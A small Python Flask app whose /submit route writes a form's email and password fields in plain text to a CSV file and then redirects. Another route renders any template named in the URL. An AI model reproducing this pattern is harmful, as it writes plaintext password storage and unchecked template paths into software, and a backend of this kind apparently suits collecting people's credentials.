from flask import Flask, render_template,send_from_directory,request,redirect
import os
import csv

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')
@app.route('/<string:page_name>')
def page(page_name):
    return render_template(page_name)

# with open('database.csv',mode='w') as db2:
#         email = 'email'
#         subject = 'subject'
#         message = 'data'
#         db_write = csv.writer(db2,delimiter = ',',quotechar='|',quoting=csv.QUOTE_NONE)
#         db_write.writerow([email,subject,message])
def csv_write(data):
    with open('database.csv',newline='',mode='a') as db:
        email = data['email']
        passwd = data['password']
        db_write = csv.writer(db,delimiter = ',',quotechar='|',quoting=csv.QUOTE_NONE)
        db_write.writerow([email,str(passwd)])


@app.route('/submit',methods=['POST','GET'])
def submit():
    if request.method == 'POST':
        data = request.form.to_dict()
        csv_write(data)
        return redirect('/index_pass.html')
    else:
        return "You havn't submit the data"




def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),'favicon.ico', mimetype='image/vnd.microsoft.icon')

if '__main__' == __name__:
    app.run()
